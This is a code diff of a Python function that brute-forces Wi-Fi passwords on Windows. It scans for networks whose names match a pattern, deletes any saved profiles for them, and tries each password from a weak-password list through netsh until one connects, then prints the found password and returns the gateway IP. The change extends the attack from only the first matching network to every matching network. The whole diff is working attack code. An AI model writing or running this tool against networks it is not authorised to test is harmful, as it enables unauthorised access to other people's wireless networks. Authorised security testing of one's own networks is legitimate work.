@@ -57,30 +57,31 @@ def brute_force_pass_wifi(patern_ssid: str, path_weak_pass: str) -> tuple[str|No
     except UnicodeDecodeError:
         ValueError(f"Could not decode file {path_weak_pass}")
 
-    ssids = scan_networks_windows(patern_ssid)
-    if not ssids:
+    results = scan_networks_windows(patern_ssid)
+    if not results:
         return None, None
-    else:
-        ssid = ssids[0]["ssid"]
-    if profile_exists(ssid):
-        cp = run(f'netsh wlan delete profile name="{ssid}"')
-        if cp.returncode != 0:
-            raise RuntimeError(f"Could not delete profile {ssid}: {cp.stderr}")
-    for password in weak_passwords:
-        if len(password) < 8:
-            continue
-        if not ssid:
-            raise ValueError(f"SSID with patern {patern_ssid} not found.")
-        try:
-            ok = connect_network_windows(ssid, password=password)
-            if ok:
-                print(f"[+] Found valid password: {password}")
-                ip = get_default_gateway()
-                return ssid, ip
-            # else:
-                # print(f"[-] Invalid password: {password}")
-        except Exception as e:
-            print(f"[-] Error connecting with password {password}: {e}")
+    ssids = [result["ssid"] for result in results]
+    for ssid in ssids:
+        print(f"Trying to connect to: {ssid} ...")
+        if profile_exists(ssid):
+            cp = run(f'netsh wlan delete profile name="{ssid}"')
+            if cp.returncode != 0:
+                raise RuntimeError(f"Could not delete profile {ssid}: {cp.stderr}")
+        for password in weak_passwords:
+            if len(password) < 8:
+                continue
+            if not ssid:
+                raise ValueError(f"SSID with patern {patern_ssid} not found.")
+            try:
+                ok = connect_network_windows(ssid, password=password)
+                if ok:
+                    print(f"[+] Found valid password Wi-Fi: {password}")
+                    ip = get_default_gateway()
+                    return ssid, ip
+                # else:
+                    # print(f"[-] Invalid password: {password}")
+            except Exception as e:
+                print(f"[-] Error connecting with password {password}: {e}")
 
     return None, None
 
